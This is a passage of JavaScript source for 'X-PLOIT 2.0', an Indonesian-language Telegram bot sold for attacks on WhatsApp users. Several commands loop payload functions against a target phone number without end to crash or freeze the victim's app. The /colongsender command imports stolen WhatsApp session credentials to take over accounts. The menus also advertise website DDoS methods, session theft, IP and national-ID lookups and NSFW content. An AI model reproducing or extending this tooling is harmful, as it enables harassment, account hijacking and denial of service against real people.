      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><b>⧼ ⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 ⧽</b></blockquote>
⛧ Number: ${lastPairingMessage.phoneNumber}
⛧ Pairing Code: ${lastPairingMessage.pairingCode}
⛧ Status: Connected
━━━━━━━━━━━━━━━━━━━━━━`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killbot", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('colongsender', async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;
  
  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');

  const doc = msg.reply_to_message?.document;
  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');

  const name = doc.file_name.toLowerCase();
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return ctx.reply('❌ File bukan session tolol.');

  await ctx.reply('🔄 Proses colong sender in you session…');

  const url = await bot.getFileLink(doc.file_id);
  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), data);
  } else if (name.endsWith('.zip')) {
    new AdmZip(data).extractAllTo(tmp, true);
  } else {
    const tmpTar = path.join(tmp, name);
    await fs.writeFile(tmpTar, data);
    await tar.x({ file: tmpTar, cwd: tmp });
  }

  const credsPath = await findCredsFile(tmp);
  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');

  const creds = await fs.readJson(credsPath);
  const botNumber = creds.me.id.split(':')[0];

  await fs.remove(destDir);
  await fs.copy(tmp, destDir);
  saveActiveSessions(botNumber);

  const auth = await useMultiFileAuthState(destDir);
  await connectToWhatsApp(botNumber, chatId, auth);

  return ctx.reply(`*SUCCES CONNECTING🫀*
  NUMBER : ${botNumber}
  *ANJAYYY KEMALING🗿*`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcprem -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcprem -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

bot.use((ctx, next) => {
    if (secureMode) return;

    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
                    (typeof data === "string" && data === "/start");

    if (!tokenValidated && !isStart) {
        if (ctx.callbackQuery) {
            try { ctx.answerCbQuery("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start <token>"); } catch (e) {}
        }
        return ctx.reply("🔒 ☇ Akses terkunci ketik /start <token> untuk mengaktifkan bot");
    }
    return next();
});

bot.start(async (ctx) => {
  if (!tokenValidated) {
    const raw = ctx.message && ctx.message.text ? ctx.message.text : "";
    const parts = raw.trim().split(" ");
    const userToken = parts.length > 1 ? parts[1].trim() : "";

    if (!userToken) {
      return ctx.reply("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start <token>");
    }

    try {
      const res = await axios.get(databaseUrl);
      const tokens = (res.data && res.data.tokens) || [];

      if (!tokens.includes(userToken) || userToken !== tokenBot) {
        return ctx.reply("❌ ☇ Token tidak terdaftar, masukkan yang valid");
      }

      tokenValidated = true;
      return ctx.reply("🌺 Tokens Valid, Please Type /start Again");
    } catch (e) {
      return ctx.reply("❌ ☇ Gagal memverifikasi token");
    }
  }

  const firstName = ctx.from.first_name || "User";

  const menuMessage = `
<blockquote><b>━━━━━━━━━━━━━━━━━━━━━━
( 👁️ ) Holla ${firstName}
Selamat datang di 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 2.0 Owner @MacMisell
Gunakan bot ini dengan bijak, tekan tombol di bawah untuk membuka menu utama. 

 👑 𝗣𝗲𝗻𝗱𝗶𝗿𝗶 : @ytimmff 
 🏆 𝗢𝘄𝗻𝗲𝗿 : @MacMisell
━━━━━━━━━━━━━━━━━━━━━━
 
 ☰ THE EFFECT
⬡ Forclose  𝙱𝚄𝚃𝚃𝙾𝙽 𝚂𝙴𝙻𝙴𝙲𝚃 𝙼𝙾𝙳𝙴
⬡ Delay  𝙳𝙴𝙻𝙰𝚈 𝙱𝙴𝚃𝙰 𝙽𝙴𝚆
⬡ Blankui  𝙱𝚄𝚃𝚃𝙾𝙽 𝙼𝙾𝙳𝙴
⬡ Blank  𝙼𝙸𝚇𝙴𝚁 𝙰 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
━━━━━━━━━━━━━━━━━━━━━━

Note Kalau mau di jadiin murbug : /addgcprem

━━━━━━━━━━━━━━━━━━━━━━
🛡 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 • 𝗖𝗼𝗿𝗲
 • Anti Bypass -- Tools Xata
 • Encrypted -- Xatanical 
 • Auto Update
 • Token Integrity Shield
━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━ 
💵 𝗣𝗿𝗶𝗰𝗲
 • Script : 25.000/25k
 • Reseller : 50.000/60k
 ━━━━━━━━━━━━━━━━━━━━━━
 
 Kamu lagi puasa? Sabar ya, setiap lapar & hausmu hari ini penuh pahala 🌙✨</b></blockquote>
 <blockquote>☰ NOTE: The Button Mode</blockquote>
`;

    try {
    // Kirim pesan awal
    const sentMsg = await ctx.replyWithVideo(welcomeVideoUrl, {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
          [
            { text: "⌜🪭⌟ Developer", url: "t.me/@MacMisell" },
            { text: "⌜🔜⌟ Menu Utama", callback_data: "/start" } // callback unik
          ]
        ]
      }
    });

    // Setup interval tombol kelap-kelip cuma untuk halaman ini
    const styles = ["primary","success","danger","secondary"];
    let index = 0;
    setInterval(async () => {
      index++; if (index >= styles.length) index = 0;

      const newKeyboard = [
        [
          { text: "⌜🪭⌟ Developer", url: "t.me/@MacMisell", style: styles[index] },
          { text: "⌜🔜⌟ Menu Utama", callback_data: "/start", style: styles[index] }
        ]
      ];

      try {
        await ctx.telegram.editMessageReplyMarkup(
          ctx.chat.id,
          sentMsg.message_id,
          undefined,
          { inline_keyboard: newKeyboard }
        );
      } catch(e) {}
    }, 3000);

  } catch(err) {
    console.error("Error menu start:", err);
  }
});

bot.action('/start', async (ctx) => {
    if (!tokenValidated) {
        try { 
            await ctx.answerCbQuery(); 
        } catch (e) {}
        return ctx.reply("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start <token>");
    }

    try {
        // Hapus menu start pertama
        try {
            await ctx.telegram.deleteMessage(ctx.chat.id, ctx.callbackQuery.message.message_id);
        } catch (error) {
            console.error("Error deleting previous menu:", error);
        }

        const senderStatus = isWhatsAppConnected ? "Yes" : "No";
        const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
        const runtimeStatus = formatRuntime();
        const memoryStatus = formatMemory();
        const cooldownStatus = loadCooldown();
        const firstName = ctx.from.first_name || "User";

        const menuMessage = `
<blockquote><b>⬡═―—⊱ 𝗫- 𝗣𝗟𝗢𝗜𝗧 ⊰―—═⬡</b></blockquote>
( 👁️ ) Welcome ${firstName},
⛧ 𝗣𝗲𝗻𝗱𝗶𝗿𝗶 : @ytimmff
⛧ 𝗢𝘄𝗻𝗲𝗿 : @MacMisell
⛧ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 2.0
⛧ 𝗣𝗿𝗲𝗳𝗶𝘅 : /
⛧ 𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲 : JavaScript

<blockquote><b>――⧼ 𝗦𝗧𝗔𝗧𝗨𝗦 𝗕𝗢𝗧 ⧽――</b></blockquote>
⛧ 𝗦𝗲𝗻𝗱𝗲𝗿: ${senderStatus}
⛧ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲: ${runtimeStatus}
⛧ 𝗠𝗲𝗺𝗼𝗿𝘆: ${memoryStatus}
⛧ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: ${cooldownStatus} Second
⛧ 𝗙𝗶𝘁𝘂𝗿 : 𝗔𝘂𝘁𝗼 𝘂𝗽𝗱𝗮𝘁𝗲

<blockquote><b>――⧼ 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 ⧽――</b></blockquote>
⛧ Security : Zeryy - Ojann
⛧ Encrypted : Xatanical 
⛧ Database : GitHub Token

<blockquote><b>⬡═―—⊱ 𝗧𝗛𝗔𝗡𝗞𝗦 ⊰―—═⬡</b></blockquote>
<blockquote><b>𝗛𝗔𝗟𝗔𝗠𝗔𝗡 1/6 </b></blockquote>
`;

        const keyboard = [
          [
            { text: "⌜🔙⌟ Back", callback_data: "/tqto", style: 'primary' },
            { text: "⌜🪭⌟ Developer", url: "t.me/@MacMisell", style: 'primary' }, 
            { text: "⌜🔜⌟ Next", callback_data: "/controls", style: 'success' }
          ]
        ];

        await ctx.replyWithPhoto(thumbnailUrl, {
            caption: menuMessage,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });

    } catch (err) {
        console.error(err);
        await ctx.reply("❌ Eror.");
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><b>⬡═―—⊱ ⎧ Tools Menu Ke 2 ⎭ ⊰―—═⬡</b></blockquote>

⛧ /addbot - Add Sender
⛧ /setcd - Set Cooldown
⛧ /killbot - Reset Session
⛧ /addprem - Add Prem
⛧ /delprem - Delete Prem
⛧ /addgcprem - Add Prem Group
⛧ /delgcprem - Delete Prem Group

<blockquote><b>⧼ ⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 ⧽</b></blockquote>
<blockquote><b>𝗛𝗔𝗟𝗔𝗠𝗔𝗡 2/6 </b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back", callback_data: "/start", style: 'success'
            },
            {
                text: "⌜🔜⌟ Next", callback_data: "/bokep", style: 'primary'
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bokep', async (ctx) => {
    const toolssMenu = `
 <blockquote><b>⬡═―—⊱ ⎧ Tools Menu ⎭ ⊰―—═⬡ </b></blockquote>
⛧ /mediafire - Convert Mediafire
⛧ /trackip - IP Information
⛧ /tiktok - Tiktok Downloader
⛧ /igdl - Instagram Downloader
⛧ /nikparse - Nik Infomation
⛧ /colongsender - Colong Sender Creds
⛧ /csessions - Colong Session#1
⛧ /getsender - Colong Session#2
⛧ /convert - To Url Media
⛧ /brat - Quotes Sticker
⛧ /yt - YouTube Search
⛧ /gethtml - Get Code HTML
⛧ /fixcode - Fixed file.js
⛧ /denc - Dencrypt file.js
⛧ /cekefek - Checking Effect Function
 
 <blockquote><b>⬡═―—⊱ ⎧ Tools Menu Ke 2 ⎭ ⊰―—═⬡</b></blockquote>
⛧ /deploy - Convert Web To Apps
⛧ /remove - Fitur Bokep Ini Ajg
‎⛧ /cekbio - Cek Bio Wa
⛧ /cekbiotele - Cek Bio Telegram
⛧ /anime - Searching Anime
⛧ /waifu - Get Waifu Anime
⛧ /nsfwwaifu - Waifu Ver Bokep
⛧ /iqc - Screen WA Iphone
⛧ /getnsfw - Bokep Anime#2
⛧ /cekfile - Cek Nokos Via File
⛧ /cekgaleri - Cek Galeri WA
⛧ /cekkontak - Cek Kontak
⛧ /videy - Bokep Lagi Ni memek
<blockquote><b>⧼ ⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 ⧽</b></blockquote>
<blockquote><b>𝗛𝗔𝗟𝗔𝗠𝗔𝗡 3/6 </b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back", callback_data: "/controls", style: 'success'
            },
            {
                text: "⌜🔜⌟ Next", callback_data: "/toolssss", style: 'primary'
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolssMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/toolssss', async (ctx) => {
    const toolsssMenu = `
 <blockquote><b>⬡═―—⊱ ⎧ Ddos Menu ⎭ ⊰―—═⬡ </b></blockquote>
⛧ /ddos - Attacking Website
⬡═―—⊱ ⎧ Metode Ddos ⎭ ⊰―—═⬡
⛧ pidoras
⛧ h2
⛧ h2vip
⛧ mix
⛧ strike
⛧ flood
<blockquote><b>⧼ ⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 ⧽</b></blockquote>
<blockquote><b>𝗛𝗔𝗟𝗔𝗠𝗔𝗡 4/6 </b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back", callback_data: "/bokep", style: 'success'
            },
            {
                text: "⌜🔜⌟ Next", callback_data: "/bug", style: 'primary'
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsssMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote>☰ 𝐁𝐔𝐆 𝐂𝐎𝐌𝐌𝐀𝐍𝐃</blockquote>
━━━━━━━━━━━━━━━━━━
⬡ /noisy - 628xxx
⬡ /Delay - 628xxx
⬡ /Blankui - 628xxx
⬡ /Fcios - 628xxx
⬡ /Blank - 628xxx
━━━━━━━━━━━━━━━━━━
<blockquote>☰ 𝐓𝐇𝐄 𝐄𝐅𝐅𝐄𝐂𝐓</blockquote>
━━━━━━━━━━━━━━━━━━
⬡ Forclose = 𝙱𝚄𝚃𝚃𝙾𝙽 𝚂𝙴𝙻𝙴𝙲𝚃 𝙼𝙾𝙳𝙴
⬡ Delay = 𝙳𝙴𝙻𝙰𝚈 𝙱𝙴𝚃𝙰 𝙽𝙴𝚆
⬡ Blankui = 𝙱𝚄𝚃𝚃𝙾𝙽 𝙼𝙾𝙳𝙴
⬡ Blank = 𝙼𝙸𝚇𝙴𝚁 𝙰 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽
━━━━━━━━━━━━━━━━━━
<blockquote>☰ 𝐍𝐎𝐓𝐄 𝐔𝐒𝐄𝐑</blockquote>
━━━━━━━━━━━━━━━━━━
𝘚𝘦𝘣𝘦𝘭𝘶𝘮 𝘔𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 𝘊𝘰𝘮𝘮𝘢𝘯𝘥 𝘉𝘶𝘨
𝘔𝘰𝘩𝘰𝘯 𝘜𝘯𝘵𝘶𝘬 𝘋𝘪 𝘉𝘢𝘤𝘢 𝘛𝘦𝘳𝘭𝘦𝘣𝘪𝘩 𝘋𝘢𝘩𝘶𝘭𝘶
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><b>⧼ ⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 ⧽</b></blockquote>
<blockquote><b>𝗛𝗔𝗟𝗔𝗠𝗔𝗡 5/6 </b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back", callback_data: "/toolssss", style: 'success'
            },
            {
                text: "⌜🔜⌟ Next", callback_data: "/tqto", style: 'primary'
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote><b>⬡═―—⊱ ⎧ Thanks To ⎭ ⊰―—═⬡</b></blockquote>
⛧ King Dapaa - Developer
⛧ Xatanical - Support
⛧ Otax - Support
⛧ Takashi - Support
⛧ Ikyy - Friend
⛧ Ojan - Friend
⛧ Zerr - Friend
⛧ Tozy - Friend
⛧ Bay - Friend
⛧ Kaiser - Friend
⛧ Yenz - Friend
⛧ Nathan - Friend
⛧ Sarzz - Friend
⛧ Asep Xyz - Friend
⛧ Xboyzz - Friend
╘═——————————————═⬡ 

<blockquote><b>⧼ ⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 ⧽</b></blockquote>
<blockquote><b>𝗛𝗔𝗟𝗔𝗠𝗔𝗡 6/6 </b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back", callback_data: "/tqto", style: 'success'
            },
            {
                text: "⌜🔜⌟ Next", callback_data: "/start", style: 'primary'
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// ~ Case Bug ~ \\
bot.command("experimen", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /experimen 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: tes func
⌑ Status: Sending…`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(sock, target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: tes func
⌑ Status   : Executed Successfully`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

// ~ Case Bug ~ \\
bot.command("noisy", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /noisy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption:
`<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: Delay Murbug
⌑ Status: Sending…
━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  while (true) {
  await CosmoDrain(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: Delay Murbug
⌑ Status   : Executed Successfully
━━━━━━━━━━━━━━━━━━━━━━
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("vinezuela", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /noisy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption:
`<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: Delay Bebas Sepam
⌑ Status: Sending…
━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  while (true) {
  await delayIOS(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: Delay Bebas Sepam
⌑ Status   : Executed Successfully

`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("ganesha", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /noisy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption:
`<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: Delay X Buldozer
⌑ Status: Sending…
━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  while (true) {
  await Nukleotix(sock, target);
  await VnXBulldo(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: Delay X Buldozer
⌑ Status   : Executed Successfully
━━━━━━━━━━━━━━━━━━━━━━
`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ ☇ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("nebula", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /noisy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption:
`<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: Delay New
⌑ Status: Sending…
━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ Target", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  while (true) {
  await Nukleotix(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><b>⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧</b></blockquote>
⌑ Target: ${q}
⌑ Type: Delay New
⌑ Status   : Executed Successfully
━━━━━━━━━━━━━━━━━━━━━━
`,
    {
      parse_mode: "HTML",
